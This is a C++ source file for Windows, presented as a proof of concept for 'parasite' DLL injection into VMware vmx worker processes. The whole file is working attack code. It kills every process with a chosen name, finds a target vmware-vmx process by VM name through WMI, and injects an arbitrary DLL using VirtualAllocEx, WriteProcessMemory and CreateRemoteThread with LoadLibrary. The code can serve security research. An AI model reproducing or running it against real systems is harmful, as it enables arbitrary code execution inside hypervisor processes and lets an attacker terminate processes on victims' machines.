// simple_injection.cpp : Defines the entry point for the console application.
//

// build: Use Multi-Byte Character Set, x64
// 
//

#include "stdafx.h"
#include <windows.h>
#include <tlhelp32.h>

#include <wbemidl.h>
#pragma comment(lib, "wbemuuid.lib")

void try_kill_all_processes_by_name(TCHAR *proc_name)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap != INVALID_HANDLE_VALUE)
	{
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(hProcessSnap, &pe32))
		{
			do
			{
				if (!_tcsnicmp(pe32.szExeFile, proc_name, MAX_PATH))
				{
					HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
					if (hProcess)
					{
						BOOL result = TerminateProcess(hProcess, -1);
						CloseHandle(hProcess);
					}						
				}

			} while (Process32Next(hProcessSnap, &pe32));
		}
		else
			printf("Process32First failed\r\n");

	}
	else
		printf("CreateToolhelp32Snapshot failed\r\n");
}

void get_process_cmdline(DWORD pid, wchar_t *cmdline, DWORD cmdline_size)
{

	HRESULT hr = 0;
	IWbemLocator         *WbemLocator = NULL;
	IWbemServices        *WbemServices = NULL;
	IEnumWbemClassObject *EnumWbem = NULL;

	//initializate the Windows security
	hr = CoInitializeEx(0, COINIT_MULTITHREADED);
	hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
	hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *)&WbemLocator);

	//connect to the WMI
	hr = WbemLocator->ConnectServer(L"ROOT\\CIMV2", NULL, NULL, NULL, 0, NULL, NULL, &WbemServices);
	//Run the WQL Query
	hr = WbemServices->ExecQuery(L"WQL", L"SELECT ProcessId,CommandLine FROM Win32_Process", WBEM_FLAG_FORWARD_ONLY, NULL, &EnumWbem);

	// Iterate over the enumerator
	if (EnumWbem != NULL) {
		IWbemClassObject *result = NULL;
		ULONG returnedCount = 0;

		while ((hr = EnumWbem->Next(WBEM_INFINITE, 1, &result, &returnedCount)) == S_OK) 
		{
			VARIANT ProcessId;
			VARIANT CommandLine;

			// access the properties
			hr = result->Get(L"ProcessId", 0, &ProcessId, 0, 0);
			if (hr == S_OK)
			{
				hr = result->Get(L"CommandLine", 0, &CommandLine, 0, 0);

				if (ProcessId.uintVal == pid && hr == S_OK && SysStringLen(CommandLine.bstrVal) != 0)
				{
					printf("cmdline: %ws\r\n", CommandLine.bstrVal);
					wcscpy_s(cmdline, cmdline_size, CommandLine.bstrVal);
					result->Release();
					break;
				}
			}


			result->Release();
		}
	}

	// Release the resources
	EnumWbem->Release();
	WbemServices->Release();
	WbemLocator->Release();

	CoUninitialize();
}

DWORD get_pid_by_process_name(TCHAR *proc_name, wchar_t *cmdline, DWORD cmdline_size, TCHAR *vm_dummy_name)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	DWORD pidy=0;

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap != INVALID_HANDLE_VALUE)
	{
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(hProcessSnap, &pe32))
		{
			do
			{
				if (!_tcsnicmp(pe32.szExeFile, proc_name, MAX_PATH))
				{
					wchar_t vm_dummy_name_wcs[255];
					SIZE_T dummy_size;
					vm_dummy_name_wcs[0] = 0;
					vm_dummy_name_wcs[1] = 0;
					mbstowcs_s(&dummy_size, vm_dummy_name_wcs, 255, vm_dummy_name, 255);
					get_process_cmdline(pe32.th32ProcessID, cmdline, cmdline_size);
	
					__try
					{
						if (wcswcs(cmdline, vm_dummy_name_wcs))
						{
							pidy=pe32.th32ProcessID;
							break;

						}
					}
					__except(EXCEPTION_EXECUTE_HANDLER)
					{ }
				}

			} while (Process32Next(hProcessSnap, &pe32));
		}
		else
			printf("Process32First failed\r\n");

		CloseHandle(hProcessSnap);
	}
	else
		printf("CreateToolhelp32Snapshot failed\r\n");

	
	return pidy;
}


bool inject_dll(DWORD pid, TCHAR *dll_path)
{
	bool ret = 0;
	HANDLE hProcess, hThread;

	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);

	if (hProcess)
	{
		SIZE_T dllpath_len= (_tcslen(dll_path) + 1) * sizeof(TCHAR);
		PVOID str_alloc = VirtualAllocEx(hProcess, NULL, dllpath_len + 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (str_alloc)
		{
			SIZE_T byteswrote=0;


			if (WriteProcessMemory(hProcess, str_alloc, dll_path, dllpath_len, &byteswrote) && byteswrote!=0)
			{
				hThread = CreateRemoteThread(hProcess,NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibrary, str_alloc, 0, NULL);
				if (hThread)
				{
					WaitForSingleObject(hThread, INFINITE);
					printf("injection seems sucessful\r\n");
					ret = 1;
				}
				else
					printf("failed to create remote thread in pid: %d\r\n", pid);

				
			}
			else
				printf("failed to write memory in pid: %d\r\n", pid);

		}
		else
			printf("failed to allocate memory in pid: %d\r\n", pid);
	}
	else
		printf("failed to open process, pid: %d\r\n",pid);

	return ret;
}


int main(int argc, TCHAR *argv[])
{
	bool result = 0;
	printf("simple X64 PoC for vmware-vmx worker parasite dll injection\r\n\r\n");
	if (argc == 2)
	{
		printf("trying to kill all processes %hs\n\r\n", argv[1]);
		try_kill_all_processes_by_name(argv[1]);
	}
	else if (argc == 4)
	{
		printf("trying to inject %hs\r\nto first process with name: %hs and cmdline: %hs\r\n\r\n", argv[2], argv[1], argv[3]);
		wchar_t cmdline[2048];
		cmdline[0] = 0;
		cmdline[1] = 0;
		DWORD pid = get_pid_by_process_name(argv[1], cmdline, 2048, argv[3]);
		if (pid)
		{
			printf("injecting dll to %hs - pid:%d\r\n", argv[1], pid);
			result=inject_dll(pid, argv[2]);
		}
		else
			printf("failed to locate pid for %hs\r\n", argv[1]);
	}
	else
		printf("usage: \r\n%hs processname.exe c:\\dir\\lib.dll dummy_vm_name\r\nto kill all processed with name:\r\n %hs processname.exe\r\n\r\n", argv[0], argv[0]);

    return result;
}
